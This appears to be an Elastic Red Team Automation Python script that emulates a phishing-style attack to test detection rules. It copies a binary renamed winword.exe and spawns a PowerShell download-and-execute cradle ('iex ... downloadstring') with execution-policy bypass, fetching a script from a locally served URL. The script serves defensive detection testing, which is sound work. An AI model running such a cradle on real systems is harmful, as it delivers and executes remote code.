# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import os
import time

from . import common
from . import RtaMetadata


metadata = RtaMetadata(
    uuid="20b96aa7-609e-473f-ac35-5ac19d10f9a5",
    platforms=["windows"],
    endpoint=[
        {
            "rule_name": "PowerShell Obfuscation Spawned via Microsoft Office",
            "rule_id": "93ef8a09-0f8d-4aa1-b0fb-47d5d5b40cf2",
        },
        {"rule_name": "Suspicious PowerShell Downloads", "rule_id": "7200673e-588c-45d5-be48-bc5c7a908d6b"},
    ],
    siem=[],
    techniques=["T1566", "T1059"],
)

EXE_FILE = common.get_path("bin", "renamed.exe")


@common.requires_os(metadata.platforms)
def main():
    server, ip, port = common.serve_web()
    url = "http://{}:{}/bad.ps1".format(ip, port)

    cmd = "powershell -ep bypass -c iex(new-object net.webclient).downloadstring('{}')".format(url)

    # Emulate Word
    user_app = "winword.exe"
    common.log("Emulating {}".format(user_app))
    user_app_path = os.path.abspath(user_app)
    common.copy_file(EXE_FILE, user_app_path)

    common.execute([user_app_path, "/c", cmd])
    time.sleep(2)

    # Cleanup
    common.remove_file(user_app_path)


if __name__ == "__main__":
    exit(main())
